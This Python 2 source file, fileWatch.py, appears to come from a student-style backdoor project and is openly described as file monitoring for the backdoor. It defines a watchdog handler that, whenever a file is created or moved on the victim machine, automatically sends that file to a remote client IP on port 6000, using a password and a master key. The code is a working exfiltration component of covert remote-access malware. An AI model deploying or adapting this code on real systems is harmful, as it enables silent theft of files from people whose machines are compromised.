#!/usr/bin/python

#-----------------------------------------------------------------------------
#-- SOURCE FILE:    fileWatch.py -   File Monitoring for client and Backdoor
#--
#-- FUNCTIONS:      on_created(self, event)
#--                 on_deleted(self, event)
#--                 on_moved(self, event)
#--
#-- DATE:           November 29, 2015
#--
#-- PROGRAMMERS:    Brij Shah & Callum Styan
#--
#-- NOTES:
#-- File monitor object for the backdoor. Includes various file event 
#-- monitoring methods.
#-----------------------------------------------------------------------------

import watchdog, helpers, configfile, time, encryption
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

#-----------------------------------------------------------------------------
#-- CLASS:          FileWatch(FileSystemEventHandler)
#--
#-- VARIABLES(S):   FileSystemEventHandler  
#--
#-- NOTES:
#-- Object for watching for files on the machine.
#-----------------------------------------------------------------------------
class FileWatch(FileSystemEventHandler):
  clientIP = ""
  def __init__(self, clientIP, protocol, password, masterkey):
    self.clientIP = clientIP
    self.protocol = protocol
    self.password = password
    self.masterkey = masterkey

  def on_created(self, event):
    print "File created: " + event.src_path
    print "calling send file"
    helpers.sendFile(self.clientIP, event.src_path, self.protocol, 6000, self.password)
    # helpers.sendFile(clientIP, event.src_path)

  def on_deleted(self, event):
    print "File deleted: " + event.src_path
    # send a message saying the file was deleted? how do we want to implement
    # this, since the client just always assumes the results from file watch will
    # be file data that it needs to save to some file output.

  def on_moved(self, event):
    print "File moved: " + event.src_path + " to " + event.dest_path
    print "calling send file"
    helpers.sendFile(self.clientIP, event.dest_path, self.protocol, 6000, self.password)